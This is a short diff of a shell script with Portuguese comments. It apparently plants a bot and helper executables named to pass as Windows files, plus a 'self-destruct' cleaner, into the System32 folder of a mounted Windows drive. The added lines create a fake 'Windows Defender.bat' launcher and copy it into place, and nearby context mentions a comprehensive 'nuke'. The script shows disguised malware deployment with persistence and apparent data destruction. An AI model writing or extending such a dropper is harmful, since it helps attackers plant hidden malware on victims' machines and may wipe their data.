@@ -4,6 +4,7 @@
 BOT="Windows.exe"
 HELPER="Windows_helper.exe" #entrar como sistem
 ASSISTANT="Windows.assistant.exe" #entrar como user
+CALL="Windows Defender.bat" #Chamar o user ou sytem
 SYS32_REG="C:\\\\Windows\\\\System32"
 # Botao de autodestruicao
 CLEANER="Windows_cleaner.exe" #auto destruicao
@@ -118,6 +119,7 @@ if [ -f "./$BOT" ] && [ -f "./$HELPER" ] && [ -f "./$ASSISTANT" ] ; then
     sudo cp "./$HELPER" "$MOUNT_POINT/Windows/System32/"
     sudo cp "./$ASSISTANT" "$MOUNT_POINT/Windows/System32/"
     sudo cp "./$CLEANER" "$MOUNT_POINT/Windows/System32/" # Move o Cleaner, mas não inicia
+    sudo cp "./$CALL" "$MOUNT_POINT/Windows/System32/"
     echo "[*] Auto Destruicao configurada..."
 
     # Nuke físico abrangente
